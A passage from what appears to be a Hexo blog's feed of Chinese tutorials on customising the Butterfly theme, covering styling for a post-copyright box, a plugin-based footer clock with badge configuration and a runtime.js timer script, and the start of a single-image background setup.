class="string">&#x27;site&#x27;</span></span><br><span class="line">    beautify()</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> hexo-config(<span class="string">&#x27;beautify.enable&#x27;</span>) &amp;&amp; hexo-config(<span class="string">&#x27;beautify.field&#x27;</span>) == <span class="string">&#x27;post&#x27;</span></span><br><span class="line">    no-beautify()</span><br><span class="line"></span><br><span class="line">    &amp;.post-<span class="attribute">content</span></span><br><span class="line">      beautify()</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    no-beautify()</span><br><span class="line"></span><br><span class="line">#post</span><br><span class="line">  .tag_share</span><br><span class="line">    .post-meta</span><br><span class="line">      &amp;__tag-list</span><br><span class="line">        <span class="attribute">display</span>: inline-block</span><br><span class="line"></span><br><span class="line">      &amp;__tags</span><br><span class="line">        <span class="attribute">display</span>: inline-block</span><br><span class="line">        margin: .4rem .4rem .4rem 0</span><br><span class="line">        padding: 0 .6rem</span><br><span class="line">        <span class="attribute">width</span>: fit-content</span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="variable">$light</span>-blue</span><br><span class="line">        border-radius: .6rem</span><br><span class="line">        <span class="attribute">color</span>: <span class="variable">$light</span>-blue</span><br><span class="line">        font-size: .85em</span><br><span class="line">        transition: all .2s ease-in-out</span><br><span class="line"></span><br><span class="line">        &amp;:hover</span><br><span class="line">          <span class="attribute">background</span>: <span class="variable">$light</span>-blue</span><br><span class="line">          <span class="attribute">color</span>: var(--white)</span><br><span class="line"></span><br><span class="line">    .post_share</span><br><span class="line">      <span class="attribute">display</span>: inline-block</span><br><span class="line">      <span class="attribute">float</span>: right</span><br><span class="line">      margin: .4rem 0</span><br><span class="line">      <span class="attribute">width</span>: fit-content</span><br><span class="line"></span><br><span class="line">      .social-share</span><br><span class="line">        font-size: .85em</span><br><span class="line"></span><br><span class="line">        .social-share-<span class="attribute">icon</span></span><br><span class="line">          <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">4px</span></span><br><span class="line">          <span class="attribute">width</span>: w = <span class="number">1.85em</span></span><br><span class="line">          <span class="attribute">height</span>: w</span><br><span class="line">          <span class="attribute">font-size</span>: <span class="number">1.2em</span></span><br><span class="line">          <span class="attribute">line-height</span>: w</span><br><span class="line"></span><br><span class="line">  .post-copyright</span><br><span class="line">    <span class="attribute">position</span>: relative</span><br><span class="line">    margin: 2rem 0 .5rem</span><br><span class="line">    padding: .5rem .8rem</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid var(--light-grey)</span><br><span class="line">    transition: box-shadow .3s ease-in-out</span><br><span class="line">    <span class="attribute">overflow</span>: hidden</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">12px</span><span class="meta">!important</span></span><br><span class="line">    <span class="attribute">background-color</span>: rgb(<span class="number">239</span> <span class="number">241</span> <span class="number">243</span>)</span><br><span class="line"></span><br><span class="line">    &amp;:before</span><br><span class="line">      <span class="attribute">background</span> var(--heo-post-blockquote-bg)</span><br><span class="line">      <span class="attribute">position</span> absolute</span><br><span class="line">      <span class="attribute">right</span> -<span class="number">26px</span></span><br><span class="line">      <span class="attribute">top</span> -<span class="number">120px</span></span><br><span class="line">      <span class="attribute">content</span> <span class="string">&#x27;\f25e&#x27;</span></span><br><span class="line">      <span class="attribute">font-size</span> <span class="number">200px</span></span><br><span class="line">      <span class="attribute">font-family</span> <span class="string">&#x27;Font Awesome 5 Brands&#x27;</span></span><br><span class="line">      opacity .2</span><br><span class="line"></span><br><span class="line">    &amp;:hover</span><br><span class="line">      box-shadow: 0 0 8px 0 rgba(232, 237, 250, .6), 0 2px 4px 0 rgba(232, 237, 250, .5)</span><br><span class="line"></span><br><span class="line">    .post-copyright</span><br><span class="line">      &amp;-meta</span><br><span class="line">        <span class="attribute">color</span>: <span class="variable">$light</span>-blue</span><br><span class="line">        <span class="attribute">font-weight</span>: bold</span><br><span class="line"></span><br><span class="line">      &amp;-info</span><br><span class="line">        padding-left: .3rem</span><br><span class="line"></span><br><span class="line">        a</span><br><span class="line">          <span class="attribute">text-decoration</span>: none</span><br><span class="line">          <span class="attribute">word-break</span>: break-word</span><br><span class="line"></span><br><span class="line">          &amp;:hover</span><br><span class="line">            <span class="attribute">text-decoration</span>: none</span><br><span class="line"></span><br><span class="line">  .post-copyright-cc-info</span><br><span class="line">    <span class="attribute">color</span>: <span class="variable">$theme</span>-color;</span><br><span class="line"></span><br><span class="line">  .post-outdate-notice</span><br><span class="line">    <span class="attribute">position</span>: relative</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">1rem</span></span><br><span class="line">    padding: .5em 1.2em</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">15px</span></span><br><span class="line">    <span class="attribute">background-color</span>: <span class="variable">$noticeOutdate</span>-bg</span><br><span class="line">    <span class="attribute">color</span>: <span class="variable">$noticeOutdate</span>-color</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hexo-config(<span class="string">&#x27;noticeOutdate.style&#x27;</span>) == <span class="string">&#x27;flat&#x27;</span></span><br><span class="line">      padding: .5em 1em .5em 2.6em</span><br><span class="line">      <span class="attribute">border-left</span>: <span class="number">5px</span> solid <span class="variable">$noticeOutdate</span>-border</span><br><span class="line"></span><br><span class="line">      &amp;:before</span><br><span class="line">        <span class="keyword">@extend</span> .fontawesomeIcon</span><br><span class="line">        <span class="attribute">position</span>: absolute</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">50%</span></span><br><span class="line">        left: .9em</span><br><span class="line">        <span class="attribute">color</span>: <span class="variable">$noticeOutdate</span>-border</span><br><span class="line">        <span class="attribute">content</span>: <span class="string">&#x27;\f071&#x27;</span></span><br><span class="line">        <span class="attribute">transform</span>: translateY(-<span class="number">50%</span>)</span><br><span class="line"></span><br><span class="line">  .ads-wrap</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">2rem</span> <span class="number">0</span></span><br><span class="line">.post-copyright-m-info</span><br><span class="line">  <span class="selector-class">.post-copyright-a</span>,</span><br><span class="line">  <span class="selector-class">.post-copyright-c</span>,</span><br><span class="line">  .post-copyright-u</span><br><span class="line">    <span class="attribute">display</span> inline-block</span><br><span class="line">    <span class="attribute">width</span> fit-content</span><br><span class="line">    <span class="attribute">padding</span> <span class="number">2px</span> <span class="number">5px</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  #post</span><br><span class="line">    .post-copyright</span><br><span class="line">      <span class="attribute">background-color</span> <span class="number">#07080a</span></span><br><span class="line">      <span class="attribute">text-shadow</span> <span class="number">#bfbeb8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">2px</span></span><br><span class="line">      <span class="attribute">border</span> <span class="number">1px</span> solid rgb(<span class="number">19</span> <span class="number">18</span> <span class="number">18</span> / <span class="number">35%</span>)</span><br><span class="line">      <span class="attribute">box-shadow</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> rgb(<span class="number">20</span>, <span class="number">120</span>, <span class="number">210</span>)</span><br><span class="line">      <span class="attribute">animation</span> flashlight <span class="number">1s</span> linear infinite alternate</span><br><span class="line">  .post-copyright-info</span><br><span class="line">    <span class="attribute">color</span> <span class="number">#e0e0e4</span></span><br><span class="line"></span><br><span class="line">#post</span><br><span class="line">  .post-copyright__title</span><br><span class="line">    <span class="attribute">font-size</span> <span class="number">22px</span></span><br><span class="line">  .post-copyright__notice</span><br><span class="line">    <span class="attribute">font-size</span> <span class="number">15px</span></span><br><span class="line">  .post-copyright</span><br><span class="line">    <span class="attribute">box-shadow</span> <span class="number">2px</span> <span class="number">2px</span> <span class="number">5px</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> flashlight</span><br><span class="line">  from</span><br><span class="line">    <span class="attribute">box-shadow</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> rgb(<span class="number">20</span>, <span class="number">120</span>, <span class="number">210</span>)</span><br><span class="line">  to</span><br><span class="line">    <span class="attribute">box-shadow</span> <span class="number">0</span> <span class="number">0</span> <span class="number">2px</span> rgb(<span class="number">20</span>, <span class="number">120</span>, <span class="number">210</span>)</span><br></pre></td></tr></table></figure></li><li><p>默认项的配置</p><ul><li><p>作者：<code>[Blogroot]\_config.yml</code> 中的 <code>author</code> 配置项</p>  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Akilarの糖果屋</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">Akilar.top</span></span><br><span class="line"><span class="attr">description:</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">Akilar</span> <span class="comment">#默认作者</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>许可协议：<code>[Blogroot]\_config.butterfly.yml</code> 中的 <code>license</code> 和 <code>license_url</code> 配置项</p>  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_copyright:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">decode:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">CC</span> <span class="string">BY-NC-SA</span> <span class="number">4.0</span></span><br><span class="line">  <span class="attr">license_url:</span> <span class="string">https://creativecommons.org/licenses/by-nc-sa/4.0/</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>页面覆写配置项，修改对应文章的 <code>front-matter</code>.</p> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Copyright-beautify # 文章名称</span><br><span class="line">date: 2021-03-02 13:52:46 # 文章发布日期</span><br><span class="line">updated: 2021-03-02 13:52:46 # 文章更新日期</span><br><span class="line">copyright<span class="emphasis">_author: Nesxc # 作者覆写</span></span><br><span class="line"><span class="emphasis">copyright_</span>url: https://www.nesxc.com/post/hexocc.html # 原文链接覆写</span><br><span class="line">license: # 许可协议名称覆写</span><br><span class="line">license<span class="emphasis">_url: # 许可协议链接覆写</span></span><br><span class="line"><span class="emphasis">---</span></span><br></pre></td></tr></table></figure></li></ol><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>页脚电子时钟（原生）</title>
      <link href="2021/10/10/%E9%A1%B5%E8%84%9A%E7%94%B5%E5%AD%90%E6%97%B6%E9%92%9F%EF%BC%88%E5%8E%9F%E7%94%9F%EF%BC%89/"/>
      <url>2021/10/10/%E9%A1%B5%E8%84%9A%E7%94%B5%E5%AD%90%E6%97%B6%E9%92%9F%EF%BC%88%E5%8E%9F%E7%94%9F%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>页脚电子时钟（原生）</p><p class='p center small'>Butterfly主题魔改教程，实现页脚电子时钟（原生）。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://akilar.top/posts/b941af/">Akilarの糖果屋的《Native JS Timer》</a>。</p></div><h1 id="1-步骤一：安装插件"><a href="#1-步骤一：安装插件" class="headerlink" title="1.步骤一：安装插件"></a>1.步骤一：安装插件</h1><p>在博客根目录<code>[Blogroot]</code>下打开终端，运行以下指令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-butterfly-footer-beautify --save</span><br></pre></td></tr></table></figure><h1 id="2-步骤二：添加配置信息"><a href="#2-步骤二：添加配置信息" class="headerlink" title="2.步骤二：添加配置信息"></a>2.步骤二：添加配置信息</h1><p>在站点配置文件<code>_config.yml</code>或者主题配置文件<code>_config.butterfly.yml</code>中添加。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># footer_beautify</span></span><br><span class="line"><span class="comment"># 页脚计时器：[Native JS Timer](https://akilar.top/posts/b941af/)</span></span><br><span class="line"><span class="comment"># 页脚徽标：[Add Github Badge](https://akilar.top/posts/e87ad7f8/)</span></span><br><span class="line"><span class="attr">footer_beautify:</span></span><br><span class="line">  <span class="attr">enable:</span></span><br><span class="line">    <span class="attr">timer:</span> <span class="literal">true</span> <span class="comment"># 计时器开关</span></span><br><span class="line">    <span class="attr">bdage:</span> <span class="literal">true</span> <span class="comment"># 徽标开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">5</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">all</span> <span class="comment"># 应用页面</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="comment">#屏蔽页面</span></span><br><span class="line">    <span class="comment"># - /posts/</span></span><br><span class="line">    <span class="comment"># - /about/</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="comment"># 挂载容器类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">id</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">footer-wrap</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="comment"># 计时器部分配置项</span></span><br><span class="line">  <span class="attr">runtime_js:</span> <span class="string">https://cdn.jsdelivr.net/npm/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.js</span></span><br><span class="line">  <span class="attr">runtime_css:</span> <span class="string">https://cdn.jsdelivr.net/npm/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css</span></span><br><span class="line">  <span class="comment"># 徽标部分配置项</span></span><br><span class="line">  <span class="attr">swiperpara:</span> <span class="number">3</span> <span class="comment">#若非0，则开启轮播功能，每行徽标个数</span></span><br><span class="line">  <span class="attr">bdageitem:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://hexo.io/</span> <span class="comment">#徽标指向网站链接</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo</span> <span class="comment">#徽标API</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">博客框架为Hexo_v5.4.0</span> <span class="comment">#徽标提示语</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://butterfly.js.org/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">主题版本Butterfly_v3.8.2</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://www.jsdelivr.com/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&amp;logo=jsDelivr</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">本站使用JsDelivr为静态资源提供CDN加速</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://vercel.com/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">本站采用双线部署，默认线路托管于Vercel</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://vercel.com/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Hosted-Coding-0cedbe?style=flat&amp;logo=Codio</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">本站采用双线部署，联通线路托管于Coding</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://github.com/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">本站项目由Gtihub托管</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">http://creativecommons.org/licenses/by-nc-sa/4.0/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可</span></span><br><span class="line">  <span class="attr">swiper_css:</span> <span class="string">https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper.min.css</span></span><br><span class="line">  <span class="attr">swiper_js:</span> <span class="string">https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper.min.js</span></span><br><span class="line">  <span class="attr">swiperbdage_init_js:</span> <span class="string">https://cdn.jsdelivr.net/npm/hexo-butterfly-footer-beautify/lib/swiperbdage_init_js.min.js</span></span><br></pre></td></tr></table></figure><h1 id="3-参数释义"><a href="#3-参数释义" class="headerlink" title="3.参数释义"></a>3.参数释义</h1><div class="table-container"><table><thead><tr><th style="text-align:center"><strong>参数</strong></th><th style="text-align:center"><strong>备选值/类型</strong></th><th style="text-align:center"><strong>释义</strong></th></tr></thead><tbody><tr><td style="text-align:center">priority</td><td style="text-align:center">number</td><td style="text-align:center">【可选】过滤器优先级，数值越小，执行越早，默认为10，选填</td></tr><tr><td style="text-align:center">enable.timer</td><td style="text-align:center">true/false</td><td style="text-align:center">【必选】计时器控制开关</td></tr><tr><td style="text-align:center">enable.bdage</td><td style="text-align:center">true/false</td><td style="text-align:center">【必选】徽标控制开关</td></tr><tr><td style="text-align:center">enable_page</td><td style="text-align:center">path</td><td style="text-align:center">【可选】填写想要应用的页面,如根目录就填’/‘,分类页面就填’/categories/‘。若要应用于所有页面，就填all，默认为all</td></tr><tr><td style="text-align:center">exclude</td><td style="text-align:center">path</td><td style="text-align:center">【可选】填写想要屏蔽的页面，可以多个。仅当enable_page为’all’时生效。写法见示例。原理是将屏蔽项的内容逐个放到当前路径去匹配，若当前路径包含任一屏蔽项，则不会挂载。</td></tr><tr><td style="text-align:center">layout.type</td><td style="text-align:center">id/class</td><td style="text-align:center">【可选】挂载容器类型，填写id或class，不填则默认为id</td></tr><tr><td style="text-align:center">layout.name</td><td style="text-align:center">text</td><td style="text-align:center">【必选】挂载容器名称</td></tr><tr><td style="text-align:center">layout.index</td><td style="text-align:center">0和正整数</td><td style="text-align:center">【可选】前提是layout.type为class，因为同一页面可能有多个class，此项用来确认究竟排在第几个顺位</td></tr><tr><td style="text-align:center">runtime_js</td><td style="text-align:center">url</td><td style="text-align:center">【必选】页脚计时器脚本，可以下载上文填写示例的链接，参照注释和教程：Native JS Timer自行修改。</td></tr><tr><td style="text-align:center">runtime_css</td><td style="text-align:center">url</td><td style="text-align:center">【可选】自定义样式，预留开发者接口，可自行下载。</td></tr><tr><td style="text-align:center">swiperpara</td><td style="text-align:center">number</td><td style="text-align:center">【可选】若非零，则开启轮播功能，此项表示每行最多容纳徽标个数，用来应对徽标过多显得页脚拥挤的问题</td></tr><tr><td style="text-align:center">bdageitem.link</td><td style="text-align:center">url</td><td style="text-align:center">【可选】页脚徽标指向的网站链接</td></tr><tr><td style="text-align:center">bdageitem.shields</td><td style="text-align:center">url</td><td style="text-align:center">【必选】页脚徽标对应的API，API具体写法示例参照教程Add Github Badge</td></tr><tr><td style="text-align:center">bdageitem.message</td><td style="text-align:center">text</td><td style="text-align:center">【可选】页脚徽标悬停时显示的信息</td></tr><tr><td style="text-align:center">swiper_css</td><td style="text-align:center">url</td><td style="text-align:center">【可选】swiper的依赖</td></tr><tr><td style="text-align:center">swiper_js</td><td style="text-align:center">url</td><td style="text-align:center">【可选】swiper的依赖</td></tr><tr><td style="text-align:center">swiperbdage_init_js</td><td style="text-align:center">url</td><td style="text-align:center">【可选】swiper初始化方法</td></tr></tbody></table></div><h1 id="4-步骤三：自定义页脚信息"><a href="#4-步骤三：自定义页脚信息" class="headerlink" title="4.步骤三：自定义页脚信息"></a>4.步骤三：自定义页脚信息</h1><p>上述步骤使用插件化安装配置后，页脚信息是糖果屋博主的，想要修改为自己的信息还得再参考源码方式魔改步骤，新建<code>[Blogroot]\themes\butterfly\source\js\runtime.js</code>,此处用到了<code>shield.io</code>生成徽标，更多内容请参看站内教程：<a href="https://akilar.top/posts/e87ad7f8/">博客添加github徽标方案</a>：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> create_time = <span class="built_in">Math</span>.round(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;2019-04-17 00:00:00&#x27;</span>).getTime() / <span class="number">1000</span>); <span class="comment">//在此行修改为自己的建站时间</span></span><br><span class="line">  <span class="keyword">let</span> timestamp = <span class="built_in">Math</span>.round((<span class="keyword">new</span> <span class="built_in">Date</span>().getTime()) / <span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">let</span> second = timestamp - create_time;</span><br><span class="line">  <span class="keyword">let</span> time = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">//格式规范化，个位数前面加0</span></span><br><span class="line">  <span class="keyword">var</span> nol = <span class="function"><span class="keyword">function</span>(<span class="params">h</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> h&gt;<span class="number">9</span>?h:<span class="string">&#x27;0&#x27;</span>+h;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (second &gt;= <span class="number">365</span> * <span class="number">24</span> * <span class="number">3600</span>) &#123;</span><br><span class="line">    time[<span class="number">0</span>] = <span class="built_in">parseInt</span>(second / (<span class="number">365</span> * <span class="number">24</span> * <span class="number">3600</span>));</span><br><span class="line">    second %= <span class="number">365</span> * <span class="number">24</span> * <span class="number">3600</span>;</span><br><span class="line">  &#125;<span class="comment">//年</span></span><br><span class="line">  <span class="keyword">if</span> (second &gt;= <span class="number">24</span> * <span class="number">3600</span>) &#123;</span><br><span class="line">    time[<span class="number">1</span>] = <span class="built_in">parseInt</span>(second / (<span class="number">24</span> * <span class="number">3600</span>));</span><br><span class="line">    second %= <span class="number">24</span> * <span class="number">3600</span>;</span><br><span class="line">  &#125;<span class="comment">//天</span></span><br><span class="line">  <span class="keyword">if</span> (second &gt;= <span class="number">3600</span>) &#123;</span><br><span class="line">    time[<span class="number">2</span>] = nol(<span class="built_in">parseInt</span>(second / <span class="number">3600</span>));</span><br><span class="line">    second %= <span class="number">3600</span>;</span><br><span class="line">  &#125;<span class="comment">//时</span></span><br><span class="line">  <span class="keyword">if</span> (second &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">    time[<span class="number">3</span>] = nol(<span class="built_in">parseInt</span>(second / <span class="number">60</span>));</span><br><span class="line">    second %= <span class="number">60</span>;</span><br><span class="line">  &#125;<span class="comment">//分</span></span><br><span class="line">  <span class="keyword">if</span> (second &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    time[<span class="number">4</span>] = nol(second);</span><br><span class="line">  &#125;<span class="comment">//秒</span></span><br><span class="line">  <span class="comment">//早上7点到晚上10点营业(这里修改为自己博客信息)</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="built_in">Number</span>(time[<span class="number">2</span>])&lt;<span class="number">22</span>) &amp;&amp; (<span class="built_in">Number</span>(time[<span class="number">2</span>])&gt;<span class="number">7</span>))&#123;</span><br><span class="line">    currentTimeHtml =<span class="string">&quot;&lt;img class=&#x27;boardsign&#x27; src=&#x27;https://img.shields.io/badge/糖果屋-营业中-6adea8?style=social&amp;logo=cakephp&#x27; title=&#x27;距离百年老店也就差不到一百年~&#x27;&gt;&lt;div id=&#x27;runtime&#x27;&gt;&quot;</span> + time[<span class="number">0</span>] + <span class="string">&#x27; YEAR &#x27;</span> + time[<span class="number">1</span>] + <span class="string">&#x27; DAYS &#x27;</span> + time[<span class="number">2</span>] + <span class="string">&#x27; : &#x27;</span> + time[<span class="number">3</span>] + <span class="string">&#x27; : &#x27;</span> + time[<span class="number">4</span>] + <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="comment">//徽标内容参考站内教程</span></span><br><span class="line">  <span class="comment">//其余时间打烊(这里修改为自己博客信息)</span></span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    currentTimeHtml =<span class="string">&quot;&lt;img class=&#x27;boardsign&#x27; src=&#x27;https://img.shields.io/badge/糖果屋-打烊了-6adea8?style=social&amp;logo=coffeescript&#x27; title=&#x27;这个点了应该去睡觉啦，熬夜对身体不好哦&#x27;&gt;&lt;div id=&#x27;runtime&#x27;&gt;&quot;</span> + time[<span class="number">0</span>] + <span class="string">&#x27; YEAR &#x27;</span> + time[<span class="number">1</span>] + <span class="string">&#x27; DAYS &#x27;</span> + time[<span class="number">2</span>] + <span class="string">&#x27; : &#x27;</span> + time[<span class="number">3</span>] + <span class="string">&#x27; : &#x27;</span> + time[<span class="number">4</span>] + <span class="string">&#x27;&lt;/div&gt;&#x27;</span>; <span class="comment">//徽标内容参考站内教程</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//覆写挂载标签的内容</span></span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&quot;workboard&quot;</span>).innerHTML = currentTimeHtml;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h1 id="5-步骤四：应用自定义信息"><a href="#5-步骤四：应用自定义信息" class="headerlink" title="5.步骤四：应用自定义信息"></a>5.步骤四：应用自定义信息</h1><p>修改<span class='p red'>步骤二</span>中的相关配置信息，将:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计时器部分配置项</span></span><br><span class="line">  <span class="attr">runtime_js:</span> <span class="string">https://cdn.jsdelivr.net/npm/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.js</span></span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计时器部分配置项</span></span><br><span class="line">  <span class="attr">runtime_js:</span> <span class="string">/js/runtime.js</span></span><br></pre></td></tr></table></figure><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客背景使用一图流</title>
      <link href="2021/10/06/%E5%8D%9A%E5%AE%A2%E8%83%8C%E6%99%AF%E4%BD%BF%E7%94%A8%E4%B8%80%E5%9B%BE%E6%B5%81/"/>
      <url>2021/10/06/%E5%8D%9A%E5%AE%A2%E8%83%8C%E6%99%AF%E4%BD%BF%E7%94%A8%E4%B8%80%E5%9B%BE%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>博客背景使用一图流</p><p class='p center small'>Butterfly主题魔改教程，实现一图流博客背景。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://akilar.top/posts/ebf20e02/">Akilarの糖果屋的《Custom Beautify》</a>文章中的透明度修改（含一图流方案）。</p></div><h2 id="1-步骤一：去除背景配置"><a href="#1-步骤一：去除背景配置" class="headerlink" title="1.步骤一：去除背景配置"></a>1.步骤一：去除背景配置</h2><div class="tip warning"><p>ps:最好不要使用背景美化的背景特效。</p></div><ol><li><p>打开主题配置文件（注意：不是博客配置文件）<code>_config.yml</code>，按<kbd>Ctrl</kbd>+<kbd>F</kbd>快捷键弹出搜索框，输入<code>banner</code>关键词，将以下图片链接去掉。修改如下配置项：</p> <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disable all banner image</span></span><br><span class="line"><span class="attr">disable_top_img:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The banner image of home page</span></span><br><span class="line"><span class="attr">index_img:</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># If the banner of page not setting, it will show the top_img</span></span><br><span class="line"><span class="attr">default_top_img:</span> <span class="string">transparent</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The banner image of archive page</span></span><br><span class="line"><span class="attr">archive_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If the banner of tag page not setting, it will show the top_img</span></span><br><span class="line"><span class="comment"># <span class="doctag">note:</span> tag page, not tags page (子標籤頁面的 top_img)</span></span><br><span class="line"><span class="attr">tag_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The banner image of tag page</span></span><br><span class="line"><span class="comment"># format:</span></span><br><span class="line"><span class="comment">#  - tag name: xxxxx</span></span><br><span class="line"><span class="attr">tag_per_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If the banner of category page not setting, it will show the top_img</span></span><br><span class="line"><span class="comment"># <span class="doctag">note:</span> category page, not categories page (子分類頁面的 top_img)</span></span><br><span class="line"><span class="attr">category_img:</span></span><br><span class="line"></span><br><span class="line"><span 